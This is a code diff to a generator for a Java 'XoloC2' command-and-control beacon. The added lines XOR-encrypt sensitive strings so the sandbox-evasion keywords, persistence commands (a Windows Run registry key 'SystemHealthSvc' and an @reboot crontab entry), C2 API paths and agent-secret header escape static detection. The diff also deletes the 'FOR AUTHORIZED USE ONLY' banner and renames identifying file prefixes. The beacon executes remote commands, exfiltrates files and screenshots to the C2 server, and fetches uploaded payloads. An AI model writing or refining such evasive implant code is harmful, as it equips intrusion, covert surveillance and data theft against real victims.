@@ -3074,6 +3074,9 @@ function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev
     .map(b => String.fromCharCode(97 + b % 26)).join('');
   const eUrls = urls.map(u => xorEnc(u, xk));
   const es = xorEnc(secret, xk);
+  // xL: encrypts a string literal at generation time → emits xDec("hex", XK) in Java source
+  // so sensitive strings never appear as plaintext in the .class constant pool
+  const xL = s => `xDec("${xorEnc(s, xk)}", XK)`;
 
   const sandboxBlock = ev.sandbox ? `
     private static void checkEnv() {
@@ -3082,10 +3085,10 @@ function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev
         } catch (Exception ignored) {}
         try {
             String u = System.getProperty("user.name","").toLowerCase();
-            for (String bad : new String[]{"sandbox","malware","virus","analyst","cuckoo","honey"})
+            for (String bad : new String[]{${xL('sandbox')},${xL('malware')},${xL('virus')},${xL('analyst')},${xL('cuckoo')},${xL('honey')}})
                 if (u.contains(bad)) System.exit(0);
             String h = java.net.InetAddress.getLocalHost().getHostName().toLowerCase();
-            for (String bad : new String[]{"sandbox","malware","virus","vbox","vmware","analysis","cuckoo"})
+            for (String bad : new String[]{${xL('sandbox')},${xL('malware')},${xL('virus')},${xL('vbox')},${xL('vmware')},${xL('analysis')},${xL('cuckoo')}})
                 if (h.contains(bad)) System.exit(0);
         } catch (Exception ignored) {}
         // Timing check — accelerated execution indicates sandbox
@@ -3112,14 +3115,14 @@ function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev
   const bgBlock = ev.background ? `
     private static void background() {
         String os = System.getProperty("os.name","").toLowerCase();
-        String daemon = System.getenv("_XOLO_DAEMON");
+        String daemon = System.getenv(${xL('_XOLO_DAEMON')});
         if (daemon != null) return;
         try {
             String javaExec = System.getProperty("java.home") + java.io.File.separator + "bin" + java.io.File.separator;
             javaExec += os.contains("win") ? "javaw" : "java";
             String jarPath = new java.io.File(Beacon.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
             ProcessBuilder pb = new ProcessBuilder(javaExec, "-jar", jarPath);
-            pb.environment().put("_XOLO_DAEMON", "1");
+            pb.environment().put(${xL('_XOLO_DAEMON')}, "1");
             if (!os.contains("win")) {
                 pb.redirectInput(new java.io.File("/dev/null"));
                 pb.redirectOutput(new java.io.File("/dev/null"));
@@ -3139,14 +3142,18 @@ function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev
             String jarPath = new java.io.File(Beacon.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
             String javaExec = System.getProperty("java.home") + java.io.File.separator + "bin" + java.io.File.separator + "java";
             if (os.contains("win")) {
-                String cmd = "reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v SystemHealthSvc /t REG_SZ /d \\"" + javaExec + " -jar " + jarPath + "\\" /f";
-                Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
+                Runtime.getRuntime().exec(new String[]{
+                    "reg", "add", ${xL('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run')},
+                    "/v", ${xL('SystemHealthSvc')}, "/t", "REG_SZ",
+                    "/d", javaExec + " -jar " + jarPath, "/f"
+                });
             } else {
-                String entry = "@reboot " + javaExec + " -jar " + jarPath;
-                Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "crontab -l 2>/dev/null"});
+                String entry = ${xL('@reboot ')} + javaExec + " -jar " + jarPath;
+                Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", ${xL('crontab -l 2>/dev/null')}});
                 String existing = new String(p.getInputStream().readAllBytes());
                 if (!existing.contains(entry)) {
-                    Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "(crontab -l 2>/dev/null; echo \\"" + entry + "\\") | crontab -"});
+                    Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c",
+                        "(" + ${xL('crontab -l 2>/dev/null')} + "; echo \\"" + entry + "\\") | crontab -"});
                 }
             }
         } catch (Exception ignored) {}
@@ -3209,11 +3216,6 @@ import java.util.*;
 import javax.net.ssl.*;
 import java.security.cert.X509Certificate;
 
-/**
- * XoloC2 Java Beacon
- * Generated: ${new Date().toISOString()}
- * FOR AUTHORIZED USE ONLY
- */
 public class Beacon {
 
     private static final String XK = "${xk}";
@@ -3307,7 +3309,7 @@ public class Beacon {
                     ((HttpsURLConnection) conn).setHostnameVerifier((h, s) -> true);
                 conn.setRequestMethod("POST");
                 conn.setRequestProperty("Content-Type", "application/json");
-                conn.setRequestProperty("X-Agent-Secret", SECRET);
+                conn.setRequestProperty(${xL('X-Agent-Secret')}, SECRET);
                 ${setUAHeaders}
                 conn.setConnectTimeout(10000); conn.setReadTimeout(15000);
                 conn.setDoOutput(true);
@@ -3324,7 +3326,7 @@ public class Beacon {
     // ── Agent ID persistence ──────────────────────────────────
     private static String getOrCreateId() {
         try {
-            File f = new File(getBaseDir(), ".beacon_id");
+            File f = new File(getBaseDir(), ${xL('.beacon_id')});
             if (f.exists()) return Files.readString(f.toPath()).trim();
             String id = UUID.randomUUID().toString();
             Files.writeString(f.toPath(), id);
@@ -3349,7 +3351,7 @@ public class Beacon {
                 if (conn instanceof HttpsURLConnection)
                     ((HttpsURLConnection) conn).setHostnameVerifier((h, s) -> true);
                 conn.setRequestMethod("GET");
-                conn.setRequestProperty("X-Agent-Secret", SECRET);
+                conn.setRequestProperty(${xL('X-Agent-Secret')}, SECRET);
                 conn.setConnectTimeout(10000); conn.setReadTimeout(30000);
                 byte[] data = conn.getInputStream().readAllBytes();
                 urlIdx = (urlIdx + i) % C2_URLS.length;
@@ -3387,7 +3389,7 @@ public class Beacon {
             "\\"pid\\":" + pid + "," +
             "\\"sleep_interval\\":" + SLEEP + "," +
             "\\"cwd\\":\\"" + jsonEscape(cwd) + "\\"}";
-        return post("/api/beacon/checkin", payload);
+        return post(${xL('/api/beacon/checkin')}, payload);
     }
 
     // ── Command execution ─────────────────────────────────────
@@ -3438,13 +3440,13 @@ public class Beacon {
             try {
                 byte[] data = Files.readAllBytes(f.toPath());
                 String b64 = Base64.getEncoder().encodeToString(data);
-                return "__b64file__:" + f.getName() + ":" + b64;
+                return ${xL('__b64file__:')} + f.getName() + ":" + b64;
             } catch (Exception e) { return "Error: " + e.getMessage(); }
         }
 
         if (cmd.equals("screenshot")) {
             try {
-                File tmp = File.createTempFile("xolo_ss_", ".png");
+                File tmp = File.createTempFile(${xL('tmp_img_')}, ".png");
                 tmp.deleteOnExit();
                 if (isWin) {
                     String psCmd = "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; " +
@@ -3466,18 +3468,18 @@ public class Beacon {
                 byte[] data = Files.readAllBytes(tmp.toPath());
                 tmp.delete();
                 String b64 = Base64.getEncoder().encodeToString(data);
-                return "__b64file__:screenshot_" + System.currentTimeMillis() + ".png:" + b64;
+                return ${xL('__b64file__:')} + "img_" + System.currentTimeMillis() + ".png:" + b64;
             } catch (Exception e) { return "Error: " + e.getMessage(); }
         }
 
-        if (cmd.startsWith("__upload__:") && taskId != null) {
+        if (cmd.startsWith(${xL('__upload__:')}) && taskId != null) {
             String[] parts = cmd.split(":", 3);
             if (parts.length < 3) return "Error: malformed upload command";
             String filename = parts[1];
             String dest = parts[2];
             if (dest.endsWith("/") || dest.endsWith("\\\\") || new File(dest).isDirectory())
                 dest = dest.replaceAll("[/\\\\\\\\]+$", "") + File.separator + filename;
-            byte[] data = getBytes("/api/beacon/fetch/" + agentId + "/" + taskId);
+            byte[] data = getBytes(${xL('/api/beacon/fetch/')} + agentId + "/" + taskId);
             if (data == null) return "Error: could not fetch " + filename;
             try {
                 Files.write(new File(dest).toPath(), data);
@@ -3517,7 +3519,7 @@ public class Beacon {
                         String result = "{\\"task_id\\":\\"" + taskId + "\\"," +
                             "\\"output\\":\\"" + jsonEscape(output) + "\\"," +
                             "\\"status\\":\\"done\\"}";
-                        post("/api/beacon/result", result);
+                        post(${xL('/api/beacon/result')}, result);
                     }
                 }
             } catch (Exception ignored) {}
